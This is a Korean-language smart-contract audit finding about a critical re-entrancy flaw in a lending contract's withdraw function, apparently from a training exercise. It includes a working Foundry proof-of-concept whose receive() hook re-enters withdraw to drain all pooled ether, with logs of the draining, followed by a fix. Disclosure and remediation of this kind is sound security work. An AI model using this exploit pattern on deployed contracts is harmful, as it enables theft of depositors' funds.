# withdraw re-entrancy를 통한 담보 인출

## 설명

<aside>

### **키워드 : Vulnerability - Re-entrancy**

### **심각도 : Critical**

memory 키워드 사용으로 인해 shallow copy된 객체가 생성되는데, 객체는 지역변수에 불과한데 여기에 변화를 적용시킨 뒤 실제 변수에 적용하지 않은채 call을 하기 때문에 re-entrancy를 활용하여 lending service에 존재하는 모든 이더를 탈취할 수 있다.

</aside>

```solidity
VaultInfo memory tempVault = vaults[msg.sender];
require(
    tempVault.collateralETH - availableWithdraw >= _amount,
    "ERROR"
);
tempVault.collateralETH -= _amount;
(bool success, ) = payable(msg.sender).call{value: _amount}("");
vaults[msg.sender] = tempVault;
```

memory 키워드를 사용하여 생성한 `tempVault` 는 얕은 복사로 생성된 지역변수 객체인데 로직에서는 `tempVault.collateralETH` 에 대해 `_amount` 를 빼는 연산을 진행한 뒤 call을 통해 이더를 전달한다.

그리고 그 이후에야(call이 끝난 뒤) `vaults[msg.sender]` 를 변화한 값으로 덮어쓰게 된다.

따라서 re-entrancy로 접근한다면 또 다시 이전(변화 전) 객체를 복사하여 동일한 연산을 진행하고 이는 무한정으로 `_amount` 를 전송할 수 있는 취약점이 된다(정확히는 Lending service에 존재하는 만큼).

## PoC

```solidity
function testPOC() external {
        supplyUSDCDepositUser1();
        supplyEtherDepositUser2();
        supplyEtherDepositUser2();
        supplyEtherDepositUser2();
        supplyEtherDepositUser2();
        supplyEtherDepositUser2();
        supplyEtherDepositUser2();
        supplyEtherDepositUser2();
        //
        vm.deal(address(this), 100000000 ether);
        lending.deposit{value: 100000000 ether}(address(0x00), 100000000 ether);

        console.log("before usdc", usdc.balanceOf(address(this)));
        (bool success, ) = address(lending).call(
            abi.encodeWithSelector(
                DreamAcademyLending.borrow.selector,
                address(usdc),
                50000000 ether
            )
        );
        console.log("after usdc", usdc.balanceOf(address(this)));
        count = 7 * 9;

        usdc.approve(address(lending), type(uint256).max);
        lending.withdraw(address(usdc), 11111111 ether);
        console.log(
            "Attack Result(usdc, ether), Lending's balance : ",
            usdc.balanceOf(address(this)),
            address(this).balance,
            address(lending).balance
        );
    }

    receive() external payable {
        while (count > 0) {
            --count;
            console.log("balance:", address(this).balance);
            lending.withdraw(address(usdc), 11111111 ether);
        }
    }
```

```solidity
Running 1 test for test/LendingTest.t.sol:Testx
[PASS] testPOC() (gas: 1436764)
Logs:
  before usdc 0
  after usdc 50000000000000000000000000
  balance: 11111111000000000000000000
  balance: 22222222000000000000000000
  balance: 33333333000000000000000000
...
  balance: 677777771000000000000000000
  balance: 688888882000000000000000000
  balance: 699999993000000000000000000
  Attack Result(usdc, ether), Lending's balance :  50000000000000000000000000 711111104000000000000000000 88888896000000000000000001
```

위의 PoC는 `100000000 ether` 를 예치한 뒤 최대(50%)로 대출을 한다.

```solidity
(bool success, ) = address(lending).call(
            abi.encodeWithSelector(
                DreamAcademyLending.borrow.selector,
                address(usdc),
                50000000 ether
            )
        );
----------------------
  before usdc 0
  after usdc 50000000000000000000000000
```

이후 re-entrancy할 횟수를 지정한다. 이는 Lending service에 존재하는 모든 이더를 탈취한 뒤 integer underflow가 발생하면 모두 rollback될 것이기에 `supplyEtherDepositUser2` 에서 예치한 금액과 횟수를 토대로 임의로 설정한 값이다. 횟수와 값을 바꾸어 최대 랜딩 서비스에 존재하는 모든 이더를 탈취할 수 있다.

`lending.withdraw(address(usdc), 11111111 ether);`

를 실행하면

```solidity
VaultInfo memory tempVault = vaults[msg.sender];
require(
    tempVault.collateralETH - availableWithdraw >= _amount,
    "ERROR"
);
tempVault.collateralETH -= _amount;
(bool success, ) = payable(msg.sender).call{value: _amount}("");
vaults[msg.sender] = tempVault;
```

코드에서 `tempVault.collateralETH` 값이 re-entrancy 하더라도 변하지 않고 고정이므로 아무런 조건 없이 re-entrancy를 반복하며 `_amount` 만큼 `msg.sender` 에게 전송하는 취약점이 발현된다.

```solidity
  Attack Result(usdc, ether), Lending's balance :  50000000000000000000000000 711111104000000000000000000 88888896000000000000000001
```

결과적으로 대출로 얻은 USDC 50000000 ether와 Re-entrancy로 빼낸 돈(내 예치금(담보) + 다른 유저들이 예치한 금액)을 얻게 된 것을 확인할 수 있다.

## 파급력

Re-entrancy를 통해 대출상태임에도 담보를 모두 빼낼 수 있으며, 심지어 Lending 서비스 전체의 이더를 탈취할 수 있는 취약점이기에 위험도는 매우 위험하다고 볼 수 있다.

또한 키워드를 잘못 사용하여 발생한 문제점이기에 취약점을 트리거함에 있어서도 별다른 특이사항이나 어려움이 존재하지 않는다.

## 해결 방법

```solidity
VaultInfo memory tempVault = vaults[msg.sender];
require(
    tempVault.collateralETH - availableWithdraw >= _amount,
    "ERROR"
);
tempVault.collateralETH -= _amount;
vaults[msg.sender] = tempVault;
(bool success, ) = payable(msg.sender).call{value: _amount}("");
```

call하기 전에 변화한 객체를 적용시킨 뒤 call을 하여 *`Checks-*Effects-Interactions` 패턴을 활용하여 re-entrancy를 통한 전체 ether 출금은 방지할 수 있다.

하지만 이 경우에도 대출금이 존재하고 대출 한계치에 도달하여 담보를 인출할 수 없는 상황임에도 불구하고 인출을 허용한다는 문제점이 존재한다.

따라서 인출하고자 하는 금액을 빼어도 Liquidation Threshold 비율을 만족하는지 체크하며 인출하도록 검사구문의 식을 수정해야 할 것이다.
